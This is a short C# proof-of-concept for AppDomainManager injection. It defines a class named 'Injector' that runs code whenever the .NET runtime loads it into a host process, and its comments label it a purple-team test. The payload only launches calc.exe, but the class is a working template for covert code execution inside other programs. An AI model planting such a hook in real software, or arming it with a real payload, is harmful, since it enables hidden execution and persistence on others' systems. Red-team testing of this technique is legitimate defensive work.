using System;
using System.Diagnostics;

namespace Payload
{
    /// <summary>
    /// Malicious AppDomainManager that executes payload when loaded by CLR.
    /// Benign payload: spawns calc.exe for Purple Team testing.
    /// </summary>
    public class Injector : AppDomainManager
    {
        public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
        {
            try
            {
                // Benign payload - spawn calculator
                Process.Start(new ProcessStartInfo
                {
                    FileName = "calc.exe",
                    UseShellExecute = true
                });

                Console.WriteLine("[+] AppDomainManager payload executed successfully");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Payload execution failed: {ex.Message}");
            }

            // Continue normal execution of host process
            base.InitializeNewDomain(appDomainInfo);
        }
    }
}
